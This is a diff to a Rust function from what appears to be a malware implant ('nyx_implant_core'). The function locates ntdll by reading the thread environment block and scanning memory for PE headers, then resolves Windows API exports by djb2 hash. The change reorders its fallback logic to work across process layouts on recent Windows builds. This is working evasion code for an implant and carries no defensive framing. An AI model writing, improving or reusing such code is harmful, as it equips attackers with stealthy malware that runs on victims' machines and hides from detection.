@@ -173,10 +173,11 @@ pub unsafe fn export_addr(module: &[u8], func: &[u8]) -> Option<usize> {
         out(reg) base,
         options(nostack, preserves_flags, readonly),
     );
-    if base == 0 {
-        // Ldr walk failed; locate ntdll from the thread's return address
-        // (RtlUserThreadStart lives inside ntdll) and scan downward for the
-        // MZ/PE header — no unmapped reads (the scan stays within ntdll).
+    // Try the parent-provided base first, then — if that missed — locate
+    // ntdll from the thread's return address (RtlUserThreadStart lives
+    // inside ntdll) and scan downward for the MZ/PE header (the scan stays
+    // within ntdll, so no unmapped reads).
+    let scan_ntdll = |func_hash: u32| -> Option<usize> {
         let ret: usize;
         core::arch::asm!(
             "mov {}, gs:[0x1798]",
@@ -191,42 +192,45 @@ pub unsafe fn export_addr(module: &[u8], func: &[u8]) -> Option<usize> {
                 if e < 0x1000 {
                     let pe = unsafe { *(cand.add(e) as *const u32) };
                     if pe == 0x0000_4550 {
-                        if let Some(r) = nyx_implant_core::resolve::export_addr_by_hash_pub(
-                            cand,
-                            nyx_implant_core::resolve::djb2(func),
-                        ) {
+                        if let Some(r) =
+                            nyx_implant_core::resolve::export_addr_by_hash_pub(cand, func_hash)
+                        {
                             return Some(r);
-                        }
-                        if lower != func {
-                            if let Some(r) = nyx_implant_core::resolve::export_addr_by_hash_pub(
-                                cand,
-                                nyx_implant_core::resolve::djb2(lower),
-                            ) {
-                                return Some(r);
-                            }
                         }
                     }
                 }
             }
             cand = cand.sub(0x1000);
         }
-        stamp_diag(0xC5);
-        return None;
-    }
-    if let Some(r) = nyx_implant_core::resolve::export_addr_by_hash_pub(
-        base as *mut u8,
-        nyx_implant_core::resolve::djb2(func),
-    ) {
-        return Some(r);
-    }
-    if lower != func {
+        None
+    };
+    // 1) parent-provided base (same-boot ASLR; may differ per-process on 24H2)
+    if base != 0 {
         if let Some(r) = nyx_implant_core::resolve::export_addr_by_hash_pub(
             base as *mut u8,
-            nyx_implant_core::resolve::djb2(lower),
+            nyx_implant_core::resolve::djb2(func),
         ) {
             return Some(r);
         }
+        if lower != func {
+            if let Some(r) = nyx_implant_core::resolve::export_addr_by_hash_pub(
+                base as *mut u8,
+                nyx_implant_core::resolve::djb2(lower),
+            ) {
+                return Some(r);
+            }
+        }
     }
+    // 2) thread return address -> ntdll scan
+    if let Some(r) = scan_ntdll(nyx_implant_core::resolve::djb2(func)) {
+        return Some(r);
+    }
+    if lower != func {
+        if let Some(r) = scan_ntdll(nyx_implant_core::resolve::djb2(lower)) {
+            return Some(r);
+        }
+    }
+    stamp_diag(0xC5);
     None
 }
 
